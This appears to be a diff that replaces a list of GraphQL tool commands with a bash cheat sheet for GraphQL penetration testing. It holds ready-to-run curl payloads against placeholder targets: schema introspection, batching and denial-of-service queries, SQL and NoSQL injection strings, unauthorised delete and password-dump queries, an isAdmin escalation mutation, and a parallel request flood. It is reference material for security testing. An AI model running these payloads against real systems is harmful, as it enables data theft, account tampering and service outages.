@@ -1,48 +1,109 @@
-### 4.2 GraphQL Testing
-    # Dump schema with auth
-    graphqlmap -u https://target.com/graphql --dump-schema --headers "Auth: Bearer TKN" 
-    
-    # Custom introspection query
-    graphqlmap -u https://target.com/graphql --method query --query '{__schema{types{name}}}' 
-    
-    # Schema reconstruction if introspection is disabled
-    clairvoyance -o schema_reconstructed.json https://target.com/graphql
-    
-    # Use wordlist and header
-    clairvoyance -w wordlist_for_graphql.txt -H "X-API-KEY: mykey" https://target.com/graphql 
+#!/bin/bash
+# ==============================================
+# GRAPHQL SECURITY TESTING CHEAT SHEET
+# ==============================================
 
-    
-    # Burp extension, can be used command-line for schema analysis (conceptual)
-    inql -t https://target.com/graphql -f schema.json
-    
-    # Fingerprint GraphQL engine and dump schema
-    graphw00f -t https://target.com/graphql -f -d -o graphw00f_fingerprint.txt 
-    
-    # Scan a list of endpoints
-    graphw00f -list list_of_graphql_endpoints.txt -o graphw00f_list_scan.txt
+# 1. RECONNAISSANCE
+# -----------------
 
-    # (nuclei has GraphQL templates)    
-    nuclei -u https://target.com/graphql -t exposures/graphql/graphql-introspection.yaml -o nuclei_graphql_introspection.txt
-    -------
-    graphqlmap -u https://target.com/graphql --dump-schema
-    clairvoyance -o schema.json https://target.com/graphql
-    inql -t https://target.com/graphql -o inql_results
-    graphw00f -d -f -t https://target.com/graphql
-    ------
-    graphqlmap -u https://target.com/graphql --dump-schema -o schema.gql
-    graphqlmap -u https://target.com/graphql --batching -o batching_vuln.txt
-    clairvoyance -o schema_full.json https://target.com/graphql -v
-    clairvoyance -o introspection_disabled.json https://target.com/graphql -b
-    inql -t https://target.com/graphql -o inql_results_full -headers "Authorization: Bearer token"
-    inql -t https://target.com/graphql -o inql_mutation_test --mutation 'mutation { createUser(name: "test", email: "test@example.com") { id } }'
-    graphw00f -d -f -t https://target.com/graphql -e
-    graphw00f -d -b -t https://target.com/graphql
-    ------
-    graphqlmap -u https://target.com/graphql --dump-schema -o schema_very_full.gql --depth 5
-    graphqlmap -u https://target.com/graphql --batching -o batching_vuln_detailed.txt --batch-size 10
-    clairvoyance -o schema_hidden.json https://target.com/graphql -v --hidden
-    clairvoyance -o custom_headers.json https://target.com/graphql -h "Authorization: Bearer admin_token"
-    inql -t https://target.com/graphql -o inql_results_extensive -headers "X-CSRF-Token: value" -cookies "sessionid=..."
-    inql -t https://target.com/graphql -o inql_mutation_complex --mutation 'mutation { updateUser(id: 1, data: { isAdmin: true }) { success } }'
-    graphw00f -d -f -t https://target.com/graphql -e -v
-    graphw00f -d -b -t https://target.com/graphql --timeout 15
+# Introspection Query (Get Schema)
+curl -X POST -H "Content-Type: application/json" -d '{"query":"{__schema{types{name}}}"}' https://api.target.com/graphql
+
+# Full Schema Dump
+curl -X POST -H "Content-Type: application/json" -d '{"query":"query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}"}' https://api.target.com/graphql | jq .
+
+# Find GraphQL Endpoints
+grep -r "graphql" /path/to/source/code
+ffuf -u https://target.com/FUZZ -w ~/wordlists/graphql_endpoints.txt
+
+# 2. COMMON VULNERABILITIES
+# -------------------------
+
+# Batching Attacks (Multiple Queries)
+curl -X POST -H "Content-Type: application/json" -d '[{"query":"query{user(id:1){email}}"},{"query":"query{user(id:2){email}}"}]' https://api.target.com/graphql
+
+# Circular Queries (DoS)
+curl -X POST -H "Content-Type: application/json" -d '{"query":"query{__typename @a @b} fragment a on Query{__typename @b @c} fragment b on Query{__typename @c @a} fragment c on Query{__typename @a @b}"}' https://api.target.com/graphql
+
+# Field Duplication (DoS)
+curl -X POST -H "Content-Type: application/json" -d '{"query":"query{user(id:1){email,email,email,email,email,email,email}}"}' https://api.target.com/graphql
+
+# 3. INJECTION TESTING
+# --------------------
+
+# SQL Injection
+curl -X POST -H "Content-Type: application/json" -d '{"query":"query{users(filter:\"'\'' OR 1=1--\"){id email}}"}' https://api.target.com/graphql
+
+# NoSQL Injection
+curl -X POST -H "Content-Type: application/json" -d '{"query":"query{login(username:\"admin'\", password:\"'\'' || '\''1'\''=='\''1\"){token}}"}' https://api.target.com/graphql
+
+# 4. AUTHORIZATION TESTING
+# -----------------------
+
+# Missing Authorization Checks
+curl -X POST -H "Content-Type: application/json" -d '{"query":"mutation{deleteUser(id:1){success}}"}' https://api.target.com/graphql
+
+# Information Disclosure
+curl -X POST -H "Content-Type: application/json" -d '{"query":"query{allUsers{id email password}}"}' https://api.target.com/graphql
+
+# 5. RATE LIMIT TESTING
+# ---------------------
+
+# Bypass Rate Limits
+for i in {1..100}; do
+  curl -X POST -H "Content-Type: application/json" -d '{"query":"query{__typename}"}' https://api.target.com/graphql &
+done
+
+# 6. TOOLS
+# --------
+
+# GraphQL Cop (Security Auditor)
+python3 graphql-cop.py -t https://api.target.com/graphql
+
+# InQL (Burp Extension)
+# Available in BApp Store
+
+# GraphQLmap
+python3 graphqlmap.py -u https://api.target.com/graphql -v
+
+# 7. MITIGATION TESTING
+# ---------------------
+
+# Introspection Disabled
+curl -X POST -H "Content-Type: application/json" -d '{"query":"{__schema{types{name}}}"}' https://api.target.com/graphql
+
+# Query Cost Analysis
+curl -X POST -H "Content-Type: application/json" -d '{"query":"query{user(id:1){posts{comments{user{posts{comments{user{email}}}}}}"}' https://api.target.com/graphql
+
+# 8. AUTOMATED SCANNING
+# ---------------------
+
+# Nuclei Templates
+nuclei -t ~/nuclei-templates/graphql/ -u https://api.target.com/graphql -o graphql_scan.txt
+
+# ==============================================
+# TIPS:
+# 1. Always check for introspection enabled
+# 2. Test all three operations: queries, mutations, subscriptions
+# 3. Look for verbose error messages
+# 4. Test for CSRF (POST with Content-Type: application/json is generally safe)
+# ==============================================
+
+# RECOMMENDED WORDLISTS:
+# ----------------------
+# /usr/share/wordlists/graphql/common_queries.txt
+# /usr/share/wordlists/graphql/directives.txt
+# /usr/share/wordlists/graphql/fields.txt
+
+# Recommended Tools to Install:
+#   GraphQL Cop - GraphQL security auditor
+#   InQL - Burp Suite extension
+#   GraphQLmap - GraphQL exploitation
+#   jq - JSON processor
+
+# Common GraphQL Endpoints:
+#   /graphql
+#   /graphiql
+#   /gql
+#   /query
+#   /api/graphql
